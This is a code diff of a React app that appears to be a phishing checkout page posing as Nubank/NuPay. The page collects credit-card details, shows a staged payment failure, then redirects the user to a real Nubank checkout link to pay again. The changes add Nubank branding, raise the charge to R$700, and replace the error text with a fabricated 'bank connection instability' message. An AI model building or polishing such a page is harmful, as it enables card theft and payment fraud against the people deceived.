@@ -184,7 +184,7 @@ const App: React.FC = () => {
       ...formData,
       products: selectedProducts,
       cardDetails: cardData,
-      total: 200.00,
+      total: 700.00,
       timestamp: new Date().toISOString(),
       status: 'payment_failed_error_screen'
     };
@@ -201,7 +201,7 @@ const App: React.FC = () => {
 
   // Step 3: User clicks "Try Again" -> Redirects to real checkout
   const handleRetryPayment = () => {
-    window.location.href = 'https://checkout.nubank.com.br/6cqFN1rPHb15dr71';
+    window.location.href = 'https://checkout.nubank.com.br/6DwcVjtRHB15dr71';
   };
 
   // --- Admin Logic ---
@@ -409,7 +409,7 @@ const App: React.FC = () => {
 
                 <div className="mb-8">
                    <p className="text-sm text-gray-500 mb-1">Valor Total</p>
-                   <p className="text-3xl font-extrabold text-nubank">R$ 200,00</p>
+                   <p className="text-3xl font-extrabold text-nubank">R$ 700,00</p>
                 </div>
 
                 <button
@@ -424,9 +424,16 @@ const App: React.FC = () => {
             {/* --- STEP 2: CREDIT CARD FORM --- */}
             {paymentStep === 'card_form' && (
               <div className="animate-in slide-in-from-right duration-300 text-left">
-                 <div className="text-center mb-6">
-                   <h2 className="text-xl font-bold text-gray-800">Dados do Cartão</h2>
-                   <p className="text-sm text-gray-500">Pagamento 100% seguro via NuPay</p>
+                 <div className="flex items-center gap-3 mb-6">
+                   <img 
+                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png" 
+                     alt="Nubank" 
+                     className="h-6 object-contain"
+                   />
+                   <div>
+                     <h2 className="text-xl font-bold text-gray-800">Dados do Cartão</h2>
+                     <p className="text-[10px] text-gray-400 uppercase tracking-widest font-bold">Pagamento 100% seguro via NuPay</p>
+                   </div>
                  </div>
                  
                  <form onSubmit={handleFinalizePayment} className="space-y-4">
@@ -500,9 +507,9 @@ const App: React.FC = () => {
                         onChange={handleCardChange}
                         className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all bg-white"
                       >
-                         {[...Array(10)].map((_, i) => (
+                         {[...Array(5)].map((_, i) => (
                            <option key={i} value={i + 1}>
-                             {i + 1}x de R$ {(200 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
+                             {i + 1}x de R$ {(700 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
                            </option>
                          ))}
                       </select>
@@ -537,9 +544,9 @@ const App: React.FC = () => {
                 <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                   <AlertCircle className="w-8 h-8 text-red-600" />
                 </div>
-                <h3 className="text-xl font-bold text-gray-900 mb-2">Ops! Algo deu errado</h3>
+                <h3 className="text-xl font-bold text-gray-900 mb-2">Erro de conexão da plataforma</h3>
                 <p className="text-gray-600 text-sm mb-6 px-4">
-                  Não foi possível processar o pagamento com os dados informados. Por favor, tente novamente através do checkout seguro.
+                  Detectamos uma instabilidade temporária na comunicação com o banco. Por favor, tente realizar o pagamento novamente pelo nosso gateway de contingência.
                 </p>
                 
                 <button
